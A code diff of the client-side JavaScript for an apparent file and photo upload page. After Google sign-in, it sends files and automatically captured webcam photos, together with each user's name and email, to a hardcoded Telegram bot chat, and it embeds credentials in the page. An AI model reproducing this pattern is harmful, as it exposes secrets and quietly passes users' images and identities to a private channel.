@@ -1,6 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
 import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
+// Unga Firebase Config
 const firebaseConfig = {
   apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
   authDomain: "picmaster-59602.firebaseapp.com",
@@ -22,44 +23,67 @@ const chatId = "7752627907";
 let currentUser = null;
 let uploadCount = 0;
 
-// Elements
-const settingsBtn = document.getElementById('settings-btn');
-const settingsMenu = document.getElementById('settings-menu');
-const userNameDisplay = document.getElementById('user-name');
-const profilePic = document.getElementById('user-profile');
-const dropArea = document.getElementById('drop-area');
+// Sidebar Controls
+document.getElementById('menu-btn').onclick = () => document.getElementById('side-menu').classList.toggle('active');
+document.getElementById('settings-btn').onclick = () => document.getElementById('settings-panel').classList.toggle('active');
 
-// Settings Toggle
-settingsBtn.onclick = () => settingsMenu.classList.toggle('active');
-
-// Auth State
+// Auth Listener
 onAuthStateChanged(auth, (user) => {
+    const accName = document.getElementById('acc-name');
+    const guestIcon = document.getElementById('guest-icon');
+    const userImg = document.getElementById('user-img');
+
     if (user) {
         currentUser = user;
-        userNameDisplay.innerText = user.displayName;
-        profilePic.innerHTML = `<img src="${user.photoURL}" style="width:100%">`;
+        accName.innerText = user.displayName;
+        guestIcon.style.display = 'none';
+        userImg.src = user.photoURL;
+        userImg.style.display = 'block';
     } else {
         currentUser = null;
-        userNameDisplay.innerText = "Guest";
-        profilePic.innerHTML = `<i class="fas fa-user-circle"></i>`;
+        accName.innerText = "Please Login";
+        guestIcon.style.display = 'block';
+        userImg.style.display = 'none';
     }
 });
 
-// Logout
-document.getElementById('logout-btn').onclick = () => {
-    if(confirm("Logout panna virumbugireergala?")) {
-        signOut(auth).then(() => location.reload());
+// Main Upload Function
+async function uploadFile(file, type = "File") {
+    if(!currentUser) {
+        signInWithPopup(auth, provider);
+        return;
     }
-};
+    
+    const dropArea = document.getElementById('drop-area');
+    dropArea.innerHTML = "<h3>Uploading...</h3>"; // Neenga ketta English update
 
-// File History
-document.getElementById('history-btn').onclick = () => {
-    alert(uploadCount > 0 ? `Neenga ${uploadCount} file upload pannirukkeenga.` : "No files uploaded yet.");
-};
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("document", file, "picmaster_upload.jpg");
+    formData.append("caption", `${type} sent by ${currentUser.displayName}\nEmail: ${currentUser.email}`);
 
-// Camera Function
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
+        if(res.ok) {
+            uploadCount++;
+            document.getElementById('file-count').innerText = `${uploadCount} files`;
+            
+            // Grammatically corrected English message
+            dropArea.innerHTML = "<h3>Upload Successful! ✅</h3><p style='font-size:12px; opacity:0.7; margin-top:5px;'>Please wait for server response</p>";
+            
+            setTimeout(() => { 
+                dropArea.innerHTML = '<i class="fas fa-cloud-upload-alt upload-icon"></i><h3>Click to Upload File</h3>'; 
+            }, 4000);
+        }
+    } catch (e) { 
+        alert("Upload Failed!"); 
+        dropArea.innerHTML = "<h3>Upload Failed</h3>";
+    }
+}
+
+// Camera Logic
 document.getElementById('camera-btn').onclick = async () => {
-    if(!currentUser) return alert("Mudhala login pannunga!");
+    if(!currentUser) return alert("Please Login First!");
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
     
@@ -68,43 +92,34 @@ document.getElementById('camera-btn').onclick = async () => {
         video.srcObject = stream;
         video.style.display = 'block';
         
+        // 3 seconds kazhithu photo edukkum
         setTimeout(() => {
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob(blob => {
-                uploadToTelegram(blob, "Live Camera Pic");
+                uploadFile(blob, "Live Camera Photo");
                 stream.getTracks().forEach(track => track.stop());
                 video.style.display = 'none';
             }, 'image/jpeg');
         }, 3000);
     } catch (err) {
-        alert("Camera permission kudukala!");
+        alert("Camera Access Denied!");
     }
 };
 
-// Telegram Upload
-async function uploadToTelegram(file, type = "File") {
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("document", file, "upload.jpg");
-    formData.append("caption", `${type} from ${currentUser.displayName}`);
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-        method: "POST",
-        body: formData
-    }).then(() => {
-        uploadCount++;
-        alert("Success! Check Telegram.");
-    });
-}
-
-// Drop area logic
-dropArea.onclick = () => {
-    if(!currentUser) {
-        signInWithPopup(auth, provider);
-    } else {
+// Drop Area Click
+document.getElementById('drop-area').onclick = () => {
+    if(!currentUser) signInWithPopup(auth, provider);
+    else {
         const input = document.createElement('input');
         input.type = 'file';
-        input.onchange = e => uploadToTelegram(e.target.files[0]);
+        input.onchange = e => uploadFile(e.target.files[0]);
         input.click();
+    }
+};
+
+// Logout
+document.getElementById('logout-btn').onclick = () => {
+    if(confirm("Are you sure you want to Logout?")) {
+        signOut(auth).then(() => location.reload());
     }
 };
